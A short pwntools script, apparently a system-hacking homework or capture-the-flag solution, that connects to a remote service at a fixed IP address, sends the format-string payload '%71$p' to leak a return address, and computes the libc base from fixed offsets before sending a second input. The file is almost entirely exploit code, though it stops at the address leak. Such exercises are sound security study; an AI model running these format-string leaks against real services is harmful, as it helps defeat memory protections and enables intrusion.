from pwn import *

port = 5000
rem = remote("52.79.50.147", port)

elf = ELF("./WHS/system_hacking_hw/problem/libc.so.6")
# print(elf.symbols[b"__libc_start_main"])
# print(list(elf.search(b"main")))
start_offset = 6496

payload = b"%71$p"
rem.sendlineafter(b"post?", payload)
rem.recvuntil(b"post:\n")
ret_addr = int(rem.recv(14), 16) - 243
lib_base = ret_addr - start_offset
print(p64(ret_addr))
print(p64(lib_base))

payload = b"hi" 
rem.sendlineafter(b"post?\n", payload)
msg = rem.recvline()
print(msg)